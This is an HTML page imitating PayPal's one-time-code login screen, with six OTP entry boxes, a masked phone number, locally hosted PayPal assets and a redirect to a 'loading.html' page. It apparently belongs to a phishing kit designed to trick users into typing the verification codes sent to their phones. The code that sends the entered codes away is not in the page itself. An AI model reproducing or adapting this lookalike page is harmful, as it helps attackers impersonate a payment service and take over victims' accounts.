<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PayPal</title>
  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
  <link rel="stylesheet" href="static/styles/main.min.css">
</head>
<body>
  <div class="main">
    <section class="login">
      <div class="container">
        <img class="logo" src="static/images/logo.svg" alt="PayPal Logo" width="34px" height="40px">

        <form action="" class="form">
          <h2>Log in with a one-time code</h2>

          <div class="form-input">
            <p>Code sent to (5XX) XXX-1257</p>
          </div>

          <div class="otp-inputs">
            <input type="text" maxlength="1" class="otp-box">
            <input type="text" maxlength="1" class="otp-box">
            <input type="text" maxlength="1" class="otp-box">
            <input type="text" maxlength="1" class="otp-box">
            <input type="text" maxlength="1" class="otp-box">
            <input type="text" maxlength="1" class="otp-box">
          </div>

          <button type="button" class="button primary" onClick="redirectTo('loading.html')">Get new code</button>
          <button type="button" class="button secondary" onClick="redirectTo('index.html')">Please confirm a different way</button>
        </form>
      </div>
    </section>

    <footer>
      <!-- a href="#" class="language-toggle">English</a> | <a href="#" class="language-toggle">Fran√ßais</a-->
    </footer>
  </div>

  <script>
    function redirectTo(url) {
      window.location.href = url;
    }
  </script>
  

  <script src="static/scripts/jquery.min.js"></script>
  <script src="static/scripts/main.js"></script>
</body>
</html>
